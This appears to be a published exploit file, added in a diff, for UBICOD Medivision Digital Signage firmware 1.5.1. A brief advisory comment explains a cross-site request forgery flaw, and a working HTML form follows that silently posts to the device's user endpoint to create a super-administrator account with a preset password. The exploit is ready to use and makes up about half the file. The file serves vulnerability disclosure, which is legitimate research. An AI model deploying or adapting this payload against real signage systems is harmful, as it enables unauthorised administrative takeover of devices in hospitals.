@@ -1,0 +1,62 @@
+# Title: UBICOD Medivision Digital Signage 1.5.1 - Cross-Site Request Forgery (Add Admin)
+# Date: 2020-07-23
+# Author: LiquidWorm
+# Product web page: http://www.medivision.co.kr
+# CVE: N/A
+
+<!--
+
+UBICOD Medivision Digital Signage 1.5.1 CSRF Add Super Admin
+
+
+Vendor: UBICOD Co., Ltd. | MEDIVISION INC.
+Product web page: http://www.medivision.co.kr
+Affected version: Firmware 1.5.1 (2013.01.3)
+
+Summary: Medivision is a service that provides everything from DID operation to
+development of DID (Digital Information Display) optimized for hospital environment
+and production of professional contents, through DID product installation, image,
+video content planning, design work, and remote control. This is a one-stop solution
+that solves management at once.
+
+Desc: The application interface allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests. This can
+be exploited to perform certain actions with administrative privileges if a logged-in
+user visits a malicious web site.
+
+Tested on: Apache/2.4.7 (Ubuntu)
+           PHP/5.5.9-1ubuntu4.22
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5574
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5574.php
+
+
+19.06.2020
+
+-->
+
+
+<html>
+  <body>
+    <form action="http://10.0.39.2/query/user/itSet" method="POST">
+      <input type="hidden" name="aa[_id]" value="" />
+      <input type="hidden" name="aa[uid]" value="testingus2" />
+      <input type="hidden" name="aa[name]" value="TestN" />
+      <input type="hidden" name="aa[pass]" value="123456" />
+      <input type="hidden" name="aa[email]" value="aa2@bb.cc" />
+      <input type="hidden" name="aa[mobile]" value="111-222-3333" />
+      <input type="hidden" name="aa[phone]" value="333-222-1111" />
+      <input type="hidden" name="aa[approval]" value="+" />
+      <input type="hidden" name="aa[grp]" value="3" />
+      <input type="hidden" name="od[]" value="name" />
+      <input type="hidden" name="ip" value="0" />
+      <input type="hidden" name="np" value="13" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
